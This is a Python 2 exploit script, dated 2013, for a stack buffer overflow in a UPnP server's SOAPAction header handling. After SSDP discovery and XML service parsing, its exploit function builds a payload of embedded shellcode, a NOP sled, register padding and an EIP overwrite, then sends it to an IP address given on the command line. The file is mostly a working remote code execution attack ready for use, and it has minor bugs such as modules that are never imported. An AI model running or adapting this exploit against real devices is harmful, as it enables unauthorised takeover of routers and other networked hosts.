#!/usr/bin/python
#
# Author          : Dejan Lukan (dejan.lukan@viris.si)
# Disclosure Date : 16. March 2013
#

import os
import sys
from SOAPpy import *
from miranda import upnp
from urlparse import urlparse
import urllib2
try:
  from lxml import etree
except ImportError:
  print "You don't have lxml python library installed."
  exit(1)
 


class UPnPService:
  """
  Class that holds the data of a single service offered by UPnP.
  """
  def __init__(self, servicetype, serviceid, controlurl, eventsuburl, scpdurl):
    self.servicetype = servicetype
    self.serviceid   = serviceid
    self.controlurl  = controlurl
    self.eventsuburl = eventsuburl
    self.scpdurp     = scpdurl
    self.actions     = []
  
  def addaction(self, action):
    self.actions.append(action)


  def __repr__(self):
    return 'UPnPService(servicetype=%s, serviceid=%s, controlurl=%s, eventsuburl=%s, scpdurl=%s)' % \
      (self.servicetype, self.serviceid, self.controlurl, self.eventsuburl, self.scpdurp)

  def __str__(self):
    return "UPnPService(%s, %s)" % (self.serviceid, self.scpdurp)
  


class UPnPAction:
  """
  Class that holds the data of a single action of some UPnP service.
  """
  def __init__(self, name):
    self.name = name
    self.args = []

  def addarg(self, arg):
    self.args.append(arg)

  def __repr__(self):
    return 'UPnpAction(name=%s, args=%s)' % (self.name, self.args)

  def __str__(self):
    return '\tUPnpAction(name=%s)' % (self.name)




class UPnPArgument:
  """
  Class that holds the data of a single argument of some UPnP action.
  """
  def __init__(self, name, direction, relatedstate):
    self.name = name
    self.direction = direction
    self.relatedstate = relatedstate

  def __repr__(self):
    return 'UPnPArgument(name=%s, direction=%s, relatedstate=%s)' % (self.name, self.direction, self.relatedstate)

  def __str__(self):
    return '\t\tUPnPArgument(name=%s, direction=%s)' % (self.name, self.direction)





class UPnPDevice:
  """
  The class for each UPnP enabled device on the network. Each device has its own instance of the
  UPnPDevice object.
  """
  def __init__(self, ip, port=1900, timeout=10, debug=1):
    self.ip      = ip
    self.port    = port
    self.timeout = timeout
    self.debug   = debug
    self.xmlurl  = ""
    self.hosturl = ""


  def search(self):
    """
    Send the M-SEARCH query to the IP to find if the UPnP is enabled. The function returns the data
    returned from the device when sending M-SEARCH to it.
    """
    packet = "M-SEARCH * HTTP/1.1\r\n"\
      "HOST: 239.255.255.250:1900\r\n"\
      "ST: ssdp:all\r\n"\
      "MX:2\r\n"\
      "MAN:\"ssdp:discover\"\r\n"
    

    # send the M-SEARCH packet to the target
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (self.ip, self.port))
    sock.settimeout(self.timeout)

    try:
      (data, addr) = sock.recvfrom(4096)
    except socket.timeout:
      print "The device didn't respond to the UPnP M-SEARCH query."
    except Exception:
      print "Unknown error occurred."

    # parse the returned data for URL to the UPnP XML
    for line in data.split('\r\n'):
      headers = line.split(': ')
      if len(headers) != 2:
        continue
      
      if headers[0] == 'Location':
        self.xmlurl = headers[1]
        return headers[1]

    return ""


  def gethosturl(self):
    """
    Get the URL of the XML file from UPnP enabled device.
    """
    if self.hosturl == "":
      xmlurl = self.search()
      self.hosturl = "http://" + urlparse(xmlurl).netloc
    
    return self.hosturl

  
  def getservices(self):
    """
    Gets and parses the XML of the UPnP device and return all the service names.
    """
    # get the url of the XML and fetch the XML
    if self.xmlurl == "":
      self.search()
    xml = urllib2.urlopen(self.xmlurl).read()
   
    # delete the namespace because various problems arise if set, like unable to use xpath() function
    xml = re.sub(r' xmlns="[^"]*"', '', xml)

    # get all the services of the UPnP XML (parse the <service> tags)
    root = etree.XML(xml)
    services = root.xpath("//service")
    servobjs = []

    for service in services:
      servicetype = service.xpath('serviceType/text()')[0]
      serviceid   = service.xpath('serviceId/text()')[0]
      controlurl  = service.xpath('controlURL/text()')[0]
      eventsuburl = service.xpath('eventSubURL/text()')[0]
      scpdurl     = service.xpath('SCPDURL/text()')[0]
      obj         = UPnPService(servicetype, serviceid, controlurl, eventsuburl, scpdurl)
      servobjs.append(obj)

    return servobjs



  def getactions(self, service):
    """
    Gets and parses all the actions of certain service.
    """
    # print service name
    if self.debug:
      print "Service: " + service.serviceid

    # get the XML
    if self.hosturl == "":
      self.gethosturl()
    xml  = urllib2.urlopen(self.hosturl + service.scpdurp).read()
    xml  = re.sub(r' xmlns="[^"]*"', '', xml)
    root = etree.XML(xml)
    actions = root.xpath("//action")

    # get all the actions of certain service (parse the <action> tags)
    for action in actions:
      name = action.xpath("name/text()")[0]
      if self.debug:
        print "\tAction: " + str(name)

      # upnp action object
      actobj = UPnPAction(name)

      # get all the arguments of certain action (parse the <argument> tags)
      args = action.xpath("argumentList/argument")
      for arg in args:
        argname = arg.xpath("name/text()")[0]
        argdirt = arg.xpath("direction/text()")[0]
        argrels = arg.xpath("relatedStateVariable/text()")[0]

        if self.debug:
          print "\t\t" + argname
        
        # upnp argument object
        argobj = UPnPArgument(argname, argdirt, argrels)
        actobj.addarg(argobj)

      service.addaction(actobj)


  def exploit(self):
    """
    Send a malformed request to the UPnPMini 1.0 server.
    """

    if self.hosturl == "":
      self.gethosturl()

    # shellcode
    shell = "\xd9\xc6\xb8\xb7\x4c\x57\xbb\xd9\x74\x24\xf4\x5b\x29\xc9" \
    "\xb1\x12\x31\x43\x17\x03\x43\x17\x83\x74\x48\xb5\x4e\x4b" \
    "\x8a\xce\x52\xf8\x6f\x62\xff\xfc\xe6\x65\x4f\x66\x34\xe5" \
    "\x23\x3f\x76\xd9\x8e\x3f\x3f\x5f\xe8\x57\xca\x95\x36\x32" \
    "\xa2\xab\x46\x2d\x6f\x25\xa7\xfd\xe9\x65\x79\xae\x46\x86" \
    "\xf0\xb1\x64\x09\x50\x59\x58\x25\x26\xf1\xce\x16\xaa\x68" \
    "\x61\xe0\xc9\x38\x2e\x7b\xec\x0c\xdb\xb6\x6f"
    

    #soap = "urn:schemas-upnp-org:service:WANIPConnection:1#"
    #soap = "\xeb\x2D"    # jmp forward for 0x01 bytes (right after the '#' char)
    #soap += "n:schemas-upnp-org:service:WANIPConnection:1#"
    #soap += "A"*2060



    # build malicious soap header
    soap = "\xeb\x2D"    # jmp forward for 0x01 bytes (right after the '#' char)
    soap += "n:schemas-upnp-org:service:WANIPConnection:1#"
    soap += shell
    soap += "\xe9\x01\x53\x76\xf8"
    soap += "\x90"*(2107-len(soap))
    
    
    soap += "B"*4     # overwrite EBX
    soap += "S"*4     # overwrite ESI
    soap += "D"*4     # overwrite EDI
    soap += "P"*4     # overwrite EBP
    # Overwrite EIP with "pop ebp, ret", because the second value on the stack points directly to
    # the string after 'Soapaction: ', which is why we must throw the first value on the stack
    # away, which we're doing with the pop ebp. Then we're returning to the next value on the stack,
    # which is exactly the address that we want.
    soap += "\x43\xee\x04\x08"     # overwrite EIP
    soap += "\"GetExternalIPAddress\""

    # HTTP Headers
    headers = {
       'SOAPAction': soap,
    }
    
    data = """
    <?xml version='1.0' encoding="UTF-8"?>
    <SOAP-ENV:Envelope
      SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
      xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
      xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    >
    <SOAP-ENV:Body>
    <ns1:action xmlns:ns1="urn:schemas-upnp-org:service:WANIPConnection:1" SOAP-ENC:root="1">
    </ns1:action>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    """

    # send request to the UPnP server
    req = urllib2.Request(self.hosturl, data, headers)
    res = urllib2.urlopen(req).read()
    print res






if __name__ == '__main__':
  # Read the IP address as command line parameter.
  if len(sys.argv) != 2:
    print "Usage: " + sys.argv[0] + " <IP>"
    exit(-1)
  ip = sys.argv[1]

  # initialize the new class for exploitation
  upnp = UPnPDevice(ip, debug=1)
  #for service in upnp.getservices():
  #  upnp.getactions(service)
  
  # send the exploit to UPnP
  upnp.exploit()

 
